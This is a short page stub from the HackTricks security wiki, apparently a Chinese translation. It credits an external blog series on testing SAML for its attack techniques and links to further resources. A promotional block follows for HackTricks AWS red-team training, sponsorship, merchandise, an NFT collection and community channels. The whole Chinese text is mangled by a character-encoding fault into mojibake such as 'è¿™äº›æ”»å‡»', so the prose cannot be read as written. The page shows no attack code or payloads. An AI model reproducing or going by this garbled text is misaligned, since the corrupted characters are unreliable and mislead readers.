è¿™äº›æ”»å‡»æŠ€æœ¯æ¥æºäº [https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\
æ‚¨å¯ä»¥åœ¨ [https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/) æ‰¾åˆ°æ›´å¤šèµ„æºå’Œæ”»ç•¥ã€‚

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š **å…³æ³¨** æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
